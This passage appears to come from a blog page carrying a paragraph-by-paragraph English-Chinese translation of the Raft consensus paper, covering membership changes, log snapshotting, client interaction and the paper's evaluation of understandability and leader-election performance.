compromising safety. Furthermore, joint consensus allows the cluster to continue servicing client requests throughout the configuration change.</p><p>联合共识（ joint consensus）允许单个服务器在不影响安全性的基础上，在不同的特定时刻进行不同配置的转换。 此外，联合共识允许集群在整个配置更改期间继续为客户端请求提供服务。</p><p>Cluster configurations are stored and communicated using special entries in the replicated log; Figure 11 illustrates the configuration change process. When the leader receives a request to change the configuration from Cold to Cnew, it stores the configuration for joint consensus (Cold,new in the figure) as a log entry and replicates that entry using the mechanisms described previously. Once a given server adds the new configuration entry to its log, it uses that configuration for all future decisions (a server always uses the latest configuration in its log, regardless of whether the entry is committed). This means that the leader will use the rules of Cold,new to determine when the log entry for Cold,new is committed. If the leader crashes, a new leader may be chosen under either Cold or Cold,new, depending on whether the winning candidate has received Cold,new. In any case, Cnew cannot make unilateral decisions during this period.</p><p>集群配置是通过使用复制日志中的特殊条目进行存储和通信； 图 11 说明了配置更改过程。 当领导者收到将配置从 Cold 更改为 Cnew 的请求时，它将联合共识的配置（图中的Cold,NEW）存储为日志条目，并按照前面所描述的机制将该条目复制给其他服务器。一旦某个服务器将收到的 Cold,new 配置日志条目并添加到自身的日志中，那么之后其所有的决策都将以此配置 Cold,new 为依据（服务器总是以日志中最新的配置为依据进行决策，无论该条目是否已提交）。 这意味着领导者将使用 Cold,new 的规则来确定 Cold,new 的日志条目何时被提交。 如果领导者发生了宕机，新的领导者将在旧配置 Cold或者联合配置 Cold,new 的机器中选举出来。这取决于获胜的候选者是否收到了 Cold,new。无论如何，Cnew在此期间不能单方面做出决定。</p><p>Once Cold,new has been committed, neitherCold norCnew can make decisions without approval of the other, and the Leader Completeness Property ensures that only servers with the Cold,new log entry can be elected as leader. It is now safe for the leader to create a log entry describing Cnew and replicate it to the cluster. Again, this configuration will take effect on each server as soon as it is seen. When the new configuration has been committed under the rules of Cnew, the old configuration is irrelevant and servers not in the new configuration can be shut down. As shown in Figure 11, there is no time when Cold and Cnew can both make unilateral decisions; this guarantees safety.</p><p>一旦 Cold,new 被提交后，具有Cold或者Cnew的服务器将不能再没有其它服务器允许的情况下单独做出任何决策，并且Leader Completeness Property 确保只有具有Cold,new 日志条目的服务器才能被选举为领导者。 此时，领导者可以安全地创建一个描述 Cnew 的日志条目并将其复制到集群的其他服务器中。 同样，当复制的服务器收到配置条目后就会立刻生效。当新的配置被提交后，旧的配置就变得无关紧要了，并且没有新配置的服务器可以被关闭了。 如图 11 所示，Cold 和 Cnew 没有时机能够单独做出决策， 这保证了安全。</p><p>There are three more issues to address for reconfiguration. The first issue is that new servers may not initially store any log entries. If they are added to the cluster in this state, it could take quite a while for them to catch up, during which time it might not be possible to commit new log entries. In order to avoid availability gaps, Raft introduces an additional phase before the configuration change, in which the new servers join the cluster as non-voting members (the leader replicates log entries to them, but they are not considered for majorities). Once the new servers have caught up with the rest of the cluster, the reconfiguration can proceed as described above.</p><p>在配置转换期间存在着三方面的问题，<strong>第一个就是新的服务器初始化启动的时候不包含任何日志条目，当它们加入集群中时，需要花费相当长的时间同步到最新的状态，在此期间，它将不能提交任何日志条目</strong>。为了避免可用性断层，Raft 在配置更改之前引入了一个额外的阶段，在这个阶段，新服务器作为非投票成员（none-voting）加入集群（领导者将日志条目复制给它们，但它们不纳入大多数考虑的范围）。当新的服务器同步到最新的状态后，就可以执行正常的配置转换过程了。</p><p>The second issue is that the cluster leader may not be part of the new configuration. In this case, the leader steps down (returns to follower state) once it has committed the Cnew log entry. This means that there will be a period of time (while it is committingCnew) when the leader is managing a cluster that does not include itself; it replicates log entries but does not count itself in majorities. The leader transition occurs when Cnew is committed because this is the first point when the new configuration can operate independently (it will always be possible to choose a leader from Cnew). Before this point, it may be the case that only a server from Cold can be elected leader.</p><p><strong>第二个问题是集群领导者可能是没有新配置的那一部分</strong>。 在这种情况下，一旦提交了Cnew配置，领导者就会被转换成跟随者。这就意味着会有一段时间领导者管理着一个不包含自己的集群。它复制日志条目，但是却将自身排除在大多数机器之外。当Cnew被提交时会发生领导者转换，因为这个是新配置可以独立运行的第一个时刻（总是可以从 Cnew 中选择领导者）。在此之前，只有处于Cold的服务器才可以被选举为领导者。</p><p>The third issue is that removed servers (those not in Cnew) can disrupt the cluster. These servers will not receive heartbeats, so they will time out and start new elections. They will then send RequestVote RPCs with new term numbers, and this will cause the current leader to revert to follower state. A new leader will eventually be elected, but the removed servers will time out again and the process will repeat, resulting in poor availability.</p><p><strong>第三个问题是无关的服务器（不在Cnew中的服务器）可能会破坏集群。</strong> 因为这些服务器不会收到心跳请求，所以它们就会产生超时并启动新一轮的选举。然后它们发送带有新的任期号的RequestVote RPCs，这就会导致当前的领导者接收到请求后转换到跟随者状态，最终会选举出一个新的领导者。但是那些无关的的服务器会再次超时，如此循环往复，最终会导致系统可用性的大大降低。</p><p>To prevent this problem, servers disregard RequestVote RPCs when they believe a current leader exists. Specifically, if a server receives a RequestVote RPC within the minimum election timeout of hearing from a current leader, it does not update its term or grant its vote. This does not affect normal elections, where each server waits at least a minimum election timeout before starting an election. However, it helps avoid disruptions from removed servers: if a leader is able to get heartbeats to its cluster, then it will not be deposed by larger term numbers.</p><p>为了避免这样的问题发生，服务器在认为当前领导者存在时会忽略 RequestVote RPC。具体来说，如果服务器在听取当前领导者的最小选举超时内收到 RequestVote RPC，则不会更新其任期或授予其投票权。这不会影响正常选举，其中每个服务器在开始选举之前至少等待<strong>最小选举超时</strong>。 然而，它有助于避免被移除的服务器造成的扰乱：如果领导者能够发送心跳给集群，那么它就不会被更大的任期号废黜。</p><h2 id="7、日志压缩"><a href="#7、日志压缩" class="headerlink" title="7、日志压缩"></a>7、日志压缩</h2><p>Raft’s log grows during normal operation to incorporate more client requests, but in a practical system, it cannot grow without bound. As the log grows longer, it occupies more space and takes more time to replay. This will eventually cause availability problems without some mechanism to discard obsolete information that has accumulated in the log.</p><p>Raft日志会伴随着系统的日常运行持续增长。但在实际应用中，我们不能让它无限制的增长下去。日志越长，占用的存储空间越多，也将耗费状态机更多时间去重放日志条目。我们需要适当的机制来处理掉日志中的过期的信息，避免其影响系统的可用性。</p><p>Snapshotting is the simplest approach to compaction. In snapshotting, the entire current system state is written to a snapshot on stable storage, then the entire log up to that point is discarded. Snapshotting is used in Chubby and ZooKeeper, and the remainder of this section describes snapshotting in Raft.</p><p>快照是最简单的压缩方法。通过快照将某一时刻系统的当前状态写入快照文件，保存到磁盘，然后将这一时刻之前的所有日志丢弃。 Chubby 和 ZooKeeper 都使用了快照技术，本节的其余部分描述 Raft 中的快照。</p><p>Incremental approaches to compaction, such as log cleaning [36] and log-structured merge trees [30, 5], are also possible. These operate on a fraction of the data at once, so they spread the load of compaction more evenly over time. They first select a region of data that has accumulated many deleted and overwritten objects, then they rewrite the live objects from that region more compactly and free the region. This requires significant additional mechanism and complexity compared to snapshotting, which simplifies the problem by always operating on the entire data set. While log cleaning would require modifications to Raft, state machines can implement LSM trees using the same interface as snapshotting.</p><p>渐进式压缩方法，例如日志清理 [36] 和日志结构合并树 [30, 5]。 它们一次对一小部分数据进行操作，因此它们会随着时间的推移更均匀地分布压缩负载。 他们首先选择一个已经积累了许多已删除和覆盖对象的数据区域，然后他们更紧凑地重写该区域中的活动对象并释放该区域。 与快照相比，这需要大量额外的机制和复杂性，这通过始终对整个数据集进行操作来简化问题。 虽然日志清理需要对 Raft 进行修改，但状态机可以使用与快照相同的接口来实现 LSM 树。</p><p>Figure 12 shows the basic idea of snapshotting in Raft. Each server takes snapshots independently, covering just the committed entries in its log. Most of the work consists of the state machine writing its current state to the snapshot. Raft also includes a small amount of metadata in the snapshot: the last included index is the index of the last entry in the log that the snapshot replaces (the last entry the state machine had applied), and the last included term is the term of this entry. These are preserved to support the AppendEntries consistency check for the first log entry following the snapshot, since that entry needs a previous log index and term. To enable cluster membership changes (Section 6), the snapshot also includes the latest configuration in the log as of last included index. Once a server completes writing a snapshot, it may delete all log entries up through the last included index, as well as any prior snapshot.</p><p>图 12 展示了 Raft 中快照的基本思想。 各个服务器独立的对已提交的日志条目进行日志快照。主要的工作是由状态机将它当前的状态写入快照文件来完成。Raft也保留了一些元信息在快照中：last included index代表状态机最后应用的日志条目索引，last included term则是指这一条目的任期。因为日志条目需要包含preLogIndex和preLogTerm这两个属性以应对AppendEntries的一致性检查。为了支持集群成员变更（第 6 节），快照文件中也在last included index配置前包含了最新的配置条目。一旦服务器完成写入快照，他就会将last include index之前的所有日志条目都删除掉，以及任何先前的快照。</p><div><p><img src="/assets/images/raft-log-compression.png" alt="Log Compression" loading="lazy"></p></div><p>Figure 12: A server replaces the committed entries in its log (indexes 1 through 5) with a new snapshot, which stores just the current state (variables x and y in this example). The snapshot’s last included index and term serve to position the snapshot in the log preceding entry 6.</p><p>图 12：服务器用新快照替换其日志中已提交的条目（索引 1 到 5），该快照仅存储当前状态（在本例中为变量 x 和 y）。 快照最后包含的索引和术语用于将快照定位在条目 6 之前的日志中。</p><p>Although servers normally take snapshots independently, the leader must occasionally send snapshots to followers that lag behind. This happens when the leader has already discarded the next log entry that it needs to send to a follower. Fortunately, this situation is unlikely in normal operation: a follower that has kept up with the leader would already have this entry. However, an exceptionally slow follower or a new server joining the cluster (Section 6) would not. The way to bring such a follower up-to-date is for the leader to send it a snapshot over the network.</p><p>尽管服务器通常独立拍摄快照，但在领导者必须偶尔向落后的跟随者发送快照，这种情况通常是由于领导者可能会丢弃了它需要发送给跟随者的下一个日志条目。 幸运的是，这种情况在正常操作中不太可能发生：和领导者保持同步的跟随者拥有着领导者的所有日志，但是，落后非常大的跟随着或者刚加入集群的服务器（第6节）却并非如此。处理此类跟随者的机制就是领导者发送日志快照来进行同步。</p><div><p><img src="/assets/images/raft-install-snapshot-rpc.png" alt="InstallSnapshot RPC" loading="lazy"></p></div><p>Figure 13: A summary of the InstallSnapshot RPC. Snapshots are split into chunks for transmission; this gives the follower a sign of life with each chunk, so it can reset its election timer.</p><p>图 13：InstallSnapshot RPC 的摘要。 快照被分成块进行传输； 这为追随者提供了每个块的生命迹象，因此它可以重置其选举计时器。</p><p>The leader uses a new RPC called InstallSnapshot to send snapshots to followers that are too far behind; see Figure 13. When a follower receives a snapshot with this RPC, it must decide what to do with its existing log entries. Usually the snapshot will contain new information not already in the recipient’s log. In this case, the follower discards its entire log; it is all superseded by the snapshot and may possibly have uncommitted entries that conflict with the snapshot. If instead the follower receives a snapshot that describes a prefix of its log (due to retransmission or by mistake), then log entries covered by the snapshot are deleted but entries following the snapshot are still valid and must be retained.</p><p>领导者使用一个名为 InstallSnapshot 的新 RPC 向落后较大的追随者发送快照； 请参见图 13。当跟随者收到带有此 RPC 的快照时，它必须决定如何处理其现有的日志条目。 通常，快照将包含收件人日志中尚未包含的新信息。 在这种情况下，跟随者会丢弃其整个日志（可能包含未提交的和和快照中有冲突的条目），然后替换为快照中的日志条目。相反，如果跟随者收到的快照中包含的日志条目是其自身日志之前的部分的条目（因为重传或其他错误），那么就会将快照覆盖的自身日志条目删除掉，但是这之后的日志条目任然有效，需要保留下来。</p><p>This snapshotting approach departs from Raft’s strong leader principle, since followers can take snapshots without the knowledge of the leader. However, we think this departure is justified. While having a leader helps avoid conflicting decisions in reaching consensus, consensus has already been reached when snapshotting, so no decisions conflict. Data still only flows from leaders to followers, just followers can now reorganize their data.</p><p>这种快照方法与 Raft 的强领导原则背道而驰，因为跟随者可以在领导者不知情的情况下拍摄快照。 然而，我们认为这种背道而驰是合理的。 虽然拥有领导者有助于在达成共识时避免冲突的决策，但在快照时已经达成共识，因此没有决策冲突。 数据仍然只从领导者流向跟随者，现在只是跟随者可以重组他们自己的数据。</p><p>We considered an alternative leader-based approach in which only the leader would create a snapshot, then it would send this snapshot to each of its followers. However, this has two disadvantages. First, sending the snapshot to each follower would waste network bandwidth and slow the snapshotting process. Each follower already has the information needed to produce its own snapshots, and it is typically much cheaper for a server to produce a snapshot from its local state than it is to send and receive one over the network. Second, the leader’s implementation would be more complex. For example, the leader would need to send snapshots to followers in parallel with replicating new log entries to them, so as not to block new client requests.</p><p>我们考虑了另一种的基于领导者的方法（leader-based approach），其中只有领导者会创建一个快照，然后将这个快照发送给它的每个追随者。 但是这种方法有两个缺点。 首先，将快照发送给每个跟随者会浪费网络带宽并拖慢整个的快照过程。 每个跟随者已经拥有了生成自己的快照所需的信息，并且服务器从其本地状态生成快照通常比通过网络发送和接收快照成本更低。 其次，领导者的实现会变得更加复杂， 例如，领导者需要在向跟随者发送快照的同时发送新的日志条目，并且不能阻塞客户端的请求。</p><p>There are two more issues that impact snapshotting performance. First, servers must decide when to snapshot. If a server snapshots too often, it wastes disk bandwidth and energy; if it snapshots too infrequently, it risks exhausting its storage capacity, and it increases the time required to replay the log during restarts. One simple strategy is to take a snapshot when the log reaches a fixed size in bytes. If this size is set to be significantly larger than the expected size of a snapshot, then the disk bandwidth overhead for snapshotting will be small.</p><p>还有两个问题会影响快照的性能。 首先，服务器必须决定何时进行快照。 如果服务器快照过于频繁，则会浪费磁盘带宽和能源； 如果快照不频繁，则有可能会耗尽其存储容量，并且会增加重新启动期间重放日志所需的时间。 一种简单的策略是在日志达到固定大小（以字节为单位）时拍摄快照。 如果将此大小设置为明显大于快照的预期大小，则快照的磁盘带宽开销将很小。</p><p>The second performance issue is that writing a snapshot can take a significant amount of time, and we do not want this to delay normal operations. The solution is to use copy-on-write techniques so that new updates can be accepted without impacting the snapshot being written. For example, state machines built with functional data structures naturally support this. Alternatively, the operating system’s copy-on-write support (e.g., fork on Linux) can be used to create an in-memory snapshot of the entire state machine (our implementation uses this approach).</p><p>第二个性能问题是写入快照可能需要大量时间，我们不希望这影响正常的系统运行，我们可以采用Cow（copy-on-write）机制，这样就可以在不影响正在写入的快照的情况下接受新的更新。例如，基于功能性结构数据的状态机（state machines built with functional data structures）就天然的支持这种特性。或者我们可以使用操作系统的copy-on-write机制（例如，Linux 上的 fork）来创建状态机的内存快照（我们的实现使用这种方法）。</p><h2 id="8、客户端交互"><a href="#8、客户端交互" class="headerlink" title="8、客户端交互"></a>8、客户端交互</h2><p>This section describes how clients interact with Raft, including how clients find the cluster leader and how Raft supports linearizable semantics [10]. These issues apply to all consensus-based systems, and Raft’s solutions are similar to other systems.</p><p>本节描述客户端如何与 Raft 交互，包括客户端如何找到集群领导者以及 Raft 如何支持线性化语义（linearizable semantics）[10]。 这些问题适用于所有基于共识算法的系统，Raft 的解决方案与其他系统大体相同。</p><p>Clients of Raft send all of their requests to the leader. When a client first starts up, it connects to a randomlychosen server. If the client’s first choice is not the leader, that server will reject the client’s request and supply information about the most recent leader it has heard from (AppendEntries requests include the network address of the leader). If the leader crashes, client requests will time out; clients then try again with randomly-chosen servers.</p><p>Raft 的客户端将它们所有的请求发送给领导者。 当客户端第一次启动时，它会连接到随机选择的服务器。 如果客户端第一连接的不是领导者，则该服务器将拒绝客户端的请求，并提供有关它最近了解到的领导者的信息（AppendEntries 请求包括领导者的网络地址）。 如果领导者宕机，客户端请求就会超时，客户端然后使用随机选择的服务器进行重试。</p><p>Our goal for Raft is to implement linearizable semantics (each operation appears to execute instantaneously, exactly once, at some point between its invocation and its response). However, as described so far Raft can execute a command multiple times: for example, if the leader crashes after committing the log entry but before responding to the client, the client will retry the command with a new leader, causing it to be executed a second time. The solution is for clients to assign unique serial numbers to every command. Then, the state machine tracks the latest serial number processed for each client, along with the associated response. If it receives a command whose serial number has already been executed, it responds immediately without re-executing the request.</p><p>我们对 Raft 的目标是实现可线性化的语义（每一次操作都是立刻执行的，并且只执行一次）。 但是，到目前为止，Raft 也存在可能多次执行同一个命令的场景：例如，如果领导者在提交日志条目后但在回复客户端之前宕机，客户端就会重新向新的领导者发送同样的命令请求，这将会导致同一个命令被再次执行。解决方案是，客户端给每一次的请求命令添加一个唯一的序列码， 然后，服务器的状态机就可以根据请求的序列码追踪到相应的回复。当服务器收到一个和之前序列码相同的命令请求时，服务器就可以不必重新执行命令，而获取响应返回给客户端。</p><p>Read-only operations can be handled without writing anything into the log. However, with no additional measures, this would run the risk of returning stale data, since the leader responding to the request might have been superseded by a newer leader of which it is unaware. Linearizable reads must not return stale data, and Raft needs two extra precautions to guarantee this without using the log. First, a leader must have the latest information on which entries are committed. The Leader Completeness Property guarantees that a leader has all committed entries, but at the start of its term, it may not know which those are. To find out, it needs to commit an entry from its term. Raft handles this by having each leader commit a blank no-op entry into the log at the start of its term. Second, a leader must check whether it has been deposed before processing a read-only request (its information may be stale if a more recent leader has been elected). Raft handles this by having the leader exchange heartbeat messages with a majority of the cluster before responding to read-only requests. Alternatively, the leader could rely on the heartbeat mechanism to provide a form of lease [9], but this would rely on timing for safety (it assumes bounded clock skew).</p><p>只读操作可以直接处理而不需要写入日志，但是可能会返回过期数据，因为响应的领导者可能已经被新的领导者所替代。线性特性不允许返回过期数据，Raft在不记录日志的情况下需要两个额外的预防措施来避免这一情况的发生。第一，领导者必须拥有最新的日志条目。 Leader Completeness Property能够保证领导者拥有所有已提交的日志条目。但是在任期之初，领导者并不知道哪些条目是已提交的。为了解决这个问题，在任期开始的时候，领导者需要提交一个空的 no-op条目。第二，领导者在处理只读请求之前必须先检测一下自己是否已经被替代。Raft通过让领导者在处理只读请求之前向集群大多数服务器发送心跳信息来处理这个问题。或者，领导人可以依赖心跳机制来实现一种租约 [9]的机制，但是这种方法依赖时序来保证安全性。</p><h2 id="9、实现和评估"><a href="#9、实现和评估" class="headerlink" title="9、实现和评估"></a>9、实现和评估</h2><p>We have implemented Raft as part of a replicated state machine that stores configuration information for RAMCloud [33] and assists in failover of the RAMCloud coordinator. The Raft implementation contains roughly 2000 lines of C++ code, not including tests, comments, or blank lines. The source code is freely available [23]. There are also about 25 independent third-party open source implementations [34] of Raft in various stages of development, based on drafts of this paper. Also, various companies are deploying Raft-based systems [34].</p><p>我们已经实现了Raft，并将其作为存储 RAMCloud [33] 的配置信息和协助 RAMCloud 协调器的故障转移的复制状态机的一部分。 Raft 实现包含大约 2000 行 C++ 代码，不包括测试、注释或空行。 源代码可免费获得[23]。 根据本文的草稿，还有大约 25 个独立的第三方开源实现 [34] Raft 处于不同的开发阶段。 此外，各种公司正在部署基于 Raft 的系统 [34]。</p><p>The remainder of this section evaluates Raft using three criteria: understandability, correctness, and performance.</p><p>本节的其余部分使用三个标准评估 Raft：可理解性、正确性和性能。</p><h3 id="9-1、可理解性"><a href="#9-1、可理解性" class="headerlink" title="9.1、可理解性"></a>9.1、可理解性</h3><p>To measure Raft’s understandability relative to Paxos, we conducted an experimental study using upper-level undergraduate and graduate students in an Advanced Operating Systems course at Stanford University and a Distributed Computing course at U.C. Berkeley. We recorded a video lecture of Raft and another of Paxos, and created corresponding quizzes. The Raft lecture covered the content of this paper except for log compaction; the Paxos lecture covered enough material to create an equivalent replicated state machine, including single-decree Paxos, multi-decree Paxos, reconfiguration, and a few optimizations needed in practice (such as leader election). The quizzes tested basic understanding of the algorithms and also required students to reason about corner cases. Each student watched one video, took the corresponding quiz, watched the second video, and took the second quiz. About half of the participants did the Paxos portion first and the other half did the Raft portion first in order to account for both individual differences in performance and experience gained from the first portion of the study. We compared participants’ scores on each quiz to determine whether participants showed a better understanding of Raft.</p><p>为了对比 Raft 和 Paxos 的可理解性，我们对斯坦福大学（Stanford University）的高级操作系统课程（Advanced Operating Systems course）和加州大学（U.C. Berkeley）的分布式计算课程（Distributed Computing course）的高年级本科生和研究生进行了实验研究。我们录制了一个 Raft 和 Paxos 的视频讲座，并创建了相应的测验。 Raft 讲座涵盖了本文的内容，除了 log compaction； Paxos 讲座涵盖了足够的材料来创建等效的复制状态机，包括单决策 Paxos、多决策 Paxos、重新配置和一些实践中所需的优化（例如领导者选举）。测验测试了对算法的基本理解，还要求学生对极端情况进行推理。每个学生观看一个视频，参加相应的测验，观看第二个视频，并参加第二个测验。大约一半的参与者先做 Paxos 部分，另一半先做 Raft 部分，以考虑到从研究的第一部分中获得的表现和经验的个体差异。我们比较了参与者在每个测验中的分数，以确定参与者是否对 Raft 表现出更好的理解。</p><div><p><img src="/assets/images/raft-paxos-compared.png" alt="Raft and Paxos" loading="lazy"></p></div><p>Figure 14: A scatter plot comparing 43 participants’ performance on the Raft and Paxos quizzes. Points above the diagonal (33) represent participants who scored higher for Raft.</p><p>图14：一个散点图，比较了43名参与者在 Raft 和 Paxos 测验中的表现。对角线（33）以上的分数代表在 Raft 得分较高的参与者。</p><p>We tried to make the comparison between Paxos and Raft as fair as possible. The experiment favored Paxos in two ways: 15 of the 43 participants reported having some prior experience with Paxos, and the Paxos video is 14% longer than the Raft video. As summarized in Table 1, we have taken steps to mitigate potential sources of bias. All of our materials are available for review [28, 31].</p><p>我们试图让 Paxos 和 Raft 之间的比较尽可能公平。 该实验在两个方面对 Paxos 有利：43 名参与者中有 15 人报告说有一些 Paxos 的先前经验，Paxos 视频比 Raft 视频长 14%。 如表 1 所述，我们已采取措施减轻潜在的偏见来源。 我们所有的材料都可供审查 [28, 31]。</p><p>On average, participants scored 4.9 points higher on the Raft quiz than on the Paxos quiz (out of a possible 60 points, the mean Raft score was 25.7 and the mean Paxos score was 20.8); Figure 14 shows their individual scores. A paired t-test states that, with 95% confidence, the true distribution of Raft scores has a mean at least 2.5 points larger than the true distribution of Paxos scores.</p><p>平均而言，参与者在 Raft 测验中的得分比 Paxos 测验高 4.9 分（在可能的 60 分中，平均 Raft 得分为 25.7，平均 Paxos 得分为 20.8）； 图 14 显示了他们的个人得分。 在成对的T检验中表明，在 95% 的置信度下，Raft 分数的真实分布的平均值至少比 Paxos 分数的真实分布高 2.5 分。</p><p>We also created a linear regression model that predicts a new student’s quiz scores based on three factors: which quiz they took, their degree of prior Paxos experience, and the order in which they learned the algorithms. The model predicts that the choice of quiz produces a 12.5-point difference in favor of Raft. This is significantly higher than the observed difference of 4.9 points, because many of the actual students had prior Paxos experience, which helped Paxos considerably, whereas it helped Raft slightly less. Curiously, the model also predicts scores 6.3 points lower on Raft for people that have already taken the Paxos quiz; although we don’t know why, this does appear to be statistically significant.</p><p>我们还创建了一个线性回归模型，该模型根据三个因素预测新生的测验分数：他们参加了哪个测验、他们先前的 Paxos 经验程度以及他们学习算法的顺序。 该模型预测测验的选择会产生 12.5 分的差异，这有利于 Raft。 这明显高于观察到的 4.9 分的差异，因为许多实际的学生之前都有 Paxos 经验，这对 Paxos 有很大帮助，而对 Raft 的帮助略小。 奇怪的是，该模型还预测已经参加 Paxos 测验的人在 Raft 上的得分低 6.3 分； 虽然我们不知道为什么，但这似乎在统计上是显著的。</p><div><p><img src="/assets/images/raft-5-point.png" alt="5 Point" loading="lazy"></p></div><p>Figure 15: Using a 5-point scale, participants were asked (left) which algorithm they felt would be easier to implement in a functioning, correct, and efficient system, and (right) which would be easier to explain to a CS graduate student.</p><p>图 15：使用 5 分制，参与者被问及（左）他们认为哪种算法在功能正常、正确且高效的系统中更容易实现，（右）哪种算法更容易向 CS 研究生解释。</p><p>We also surveyed participants after their quizzes to see which algorithm they felt would be easier to implement or explain; these results are shown in Figure 15. An overwhelming majority of participants reported Raft would be easier to implement and explain (33 of 41 for each question). However, these self-reported feelings may be less reliable than participants’ quiz scores, and participants may have been biased by knowledge of our hypothesis that Raft is easier to understand.</p><p>我们还在测验后对参与者进行了调查，以了解他们认为哪种算法更容易实现或解释； 这些结果显示在图 15 中。绝大多数参与者报告说 Raft 更容易实现和解释（每个问题 41 个中的 33 个）。 然而，这些自我报告的感觉可能不如参与者的测验分数可靠，而且参与者可能因为我们对 Raft 更容易理解的假设的了解而产生偏见。</p><p>A detailed discussion of the Raft user study is available at [31].</p><p>Raft 用户研究的详细讨论可在 [31] 中找到。</p><h3 id="9-2、正确性"><a href="#9-2、正确性" class="headerlink" title="9.2、正确性"></a>9.2、正确性</h3><p>We have developed a formal specification and a proof of safety for the consensus mechanism described in Section 5. The formal specification [31] makes the information summarized in Figure 2 completely precise using the TLA+ specification language [17]. It is about 400 lines long and serves as the subject of the proof. It is also useful on its own for anyone implementing Raft. We have mechanically proven the Log Completeness Property using the TLA proof system [7]. However, this proof relies on invariants that have not been mechanically checked (for example, we have not proven the type safety of the specification). Furthermore, we have written an informal proof [31] of the State Machine Safety property which is complete (it relies on the specification alone) and relatively precise (it is about 3500 words long).</p><p>我们已经为第 5 节中描述的共识机制制定了正式规范和安全证明。正式规范 [31] 使用 TLA+ 规范语言 [17] 使图 2 中总结的信息完全准确。 它大约有 400 行长，作为证明的主题。 对于任何实现 Raft 的人来说，它本身也很有用。 我们已经使用 TLA 证明系统 [7] 机械证明了日志完整性属性。 然而，这个证明依赖于没有经过机械检查的不变量（例如，我们没有证明规范的类型安全）。 此外，我们编写了状态机安全属性的非正式证明 [31]，该证明是完整的（仅依赖于规范）且相对精确（大约 3500 字长）。</p><div><p><img src="/assets/images/raft-data.png" alt="Raft" loading="lazy"></p></div><p>Table 1: Concerns of possible bias against Paxos in the study, steps taken to counter each, and additional materials available.</p><p>表 1：研究中对 Paxos 可能存在偏见的担忧、针对每种偏见采取的措施以及可用的其他材料。</p><div><p><img src="/assets/images/raft-replace-time.png" alt="The time to detect and replace a crashed leader" loading="lazy"></p></div><p>Figure 16: The time to detect and replace a crashed leader. The top graph varies the amount of randomness in election timeouts, and the bottom graph scales the minimum election timeout. Each line represents 1000 trials (except for 100 trials for “150–150ms”) and corresponds to a particular choice of election timeouts; for example, “150–155ms” means that election timeouts were chosen randomly and uniformly between 150ms and 155ms. The measurements were taken on a cluster of five servers with a broadcast time of roughly 15ms. Results for a cluster of nine servers are similar.</p><p>图 16：检测和更换宕机的领导者所需的时间。 上图改变了选举超时的随机性，下图缩放了最小选举超时。 每行代表 1000 次试验（除了“150-150ms”的 100 次试验）并且对应于选举超时的特定选择； 例如，“150-155ms”表示选举超时时间是随机选择的，并且在 150ms 和 155ms 之间统一。 测量是在五台服务器的集群上进行的，广播时间大约为 15 毫秒。 九台服务器集群的结果是相似的。</p><h3 id="9-3、性能"><a href="#9-3、性能" class="headerlink" title="9.3、性能"></a>9.3、性能</h3><p>Raft’s performance is similar to other consensus algorithms such as Paxos. The most important case for performance is when an established leader is replicating new log entries. Raft achieves this using the minimal number of messages (a single round-trip from the leader to half the cluster). It is also possible to further improve Raft’s performance. For example, it easily supports batching and pipelining requests for higher throughput and lower latency. Various optimizations have been proposed in the literature for other algorithms; many of these could be applied to Raft, but we leave this to future work.</p><p>Raft 的性能类似于 Paxos 等其他共识算法。 性能最重要的情况是当已建立的领导者正在复制新的日志条目时。 Raft 使用最少数量的消息（从领导者到一半集群的单次往返）实现了这一点。 还可以进一步提高 Raft 的性能。 例如，它可以轻松支持批处理和流水线请求，以实现更高的吞吐量和更低的延迟。 在其他算法的文献中已经提出了各种优化； 其中许多可以应用于 Raft，但我们将其留给未来的工作。</p><p>We used our Raft implementation to measure the performance of Raft’s leader election algorithm and answer two questions. First, does the election process converge quickly? Second, what is the minimum downtime that can be achieved after leader crashes?</p><p>我们使用 Raft 实现来衡量 Raft 的领导者选举算法的性能并回答两个问题。 第一，选举过程收敛很快吗？ 其次，领导者宕机后可以达到的最小停机时间是多少？</p><p>To measure leader election, we repeatedly crashed the leader of a cluster of five servers and timed how long it took to detect the crash and elect a new leader (see Figure 16). To generate a worst-case scenario, the servers in each trial had different log lengths, so some candidates were not eligible to become leader. Furthermore, to encourage split votes, our test script triggered a synchronized broadcast of heartbeat RPCs from the leader before terminating its process (this approximates the behavior of the leader replicating a new log entry prior to crashing). The leader was crashed uniformly randomly within its heartbeat interval, which was half of the minimum election timeout for all tests. Thus, the smallest possible downtime was about half of the minimum election timeout.</p><p>为了衡量领导者选举，我们反复让五台服务器组成的集群的领导者宕机，并对检测到宕机和选举新领导所需的时间进行计时（见图 16）。 为了产生最坏的情况，每次试验中的服务器都有不同的日志长度，因此一些候选者没有资格成为领导者。 此外，为了鼓励分裂投票，我们的测试脚本在终止进程之前触发了来自领导者的心跳 RPC 的同步广播（这近似于领导者在崩溃之前复制新日志条目的行为）。 领导者在其心跳间隔内均匀随机崩溃，这是所有测试的最小选举超时时间的一半。 因此，最小可能的停机时间大约是最小选举超时时间的一半。</p><p>The top graph in Figure 16 shows that a small amount of randomization in the election timeout is enough to avoid split votes in elections. In the absence of randomness, leader election consistently took longer than 10 seconds in our tests due to many split votes. Adding just 5ms of randomness helps significantly, resulting in a median downtime of 287ms. Using more randomness improves worst-case behavior: with 50ms of randomness the worstcase completion time (over 1000 trials) was 513ms.</p><p>图 16 中的顶部图表显示，选举超时中的少量随机化足以避免选举中的分裂投票。 在缺乏随机性的情况下，由于许多分裂选票，在我们的测试中，领导者选举的时间始终超过 10 秒。 仅添加 5 毫秒的随机性有很大帮助，导致平均停机时间为 287 毫秒。 使用更多的随机性可以改善最坏情况的行为：随机性为 50 毫秒时，最坏情况的完成时间（超过 1000 次试验）为 513 毫秒。</p><p>The bottom graph in Figure 16 shows that downtime can be reduced by reducing the election timeout. With an election timeout of 12–24ms, it takes only 35ms on average to elect a leader (the longest trial took 152ms). However, lowering the timeouts beyond this point violates Raft’s timing requirement: leaders have difficulty broadcasting heartbeats before other servers start new elections. This can cause unnecessary leader changes and lower overall system availability. We recommend using a conservative election timeout such as 150–300ms; such timeouts are unlikely to cause unnecessary leader changes and will still provide good availability.</p><p>图 16 中的底部图表显示可以通过减少选举超时来减少停机时间。 选举超时时间为 12-24 毫秒，平均只需要 35 毫秒就可以选举出一个领导者（最长的试验需要 152 毫秒）。 然而，将超时时间降低到这一点之后违反了 Raft 的时间要求：在其他服务器开始新的选举之前，领导者很难广播心跳。 这可能会导致不必要的领导者变更并降低整体系统可用性。 我们建议使用保守的选举超时，例如 150-300 毫秒； 此类超时不太可能导致不必要的领导者更改，并且仍将提供良好的可用性。</p><h2 id="10、相关工作"><a href="#10、相关工作" class="headerlink" 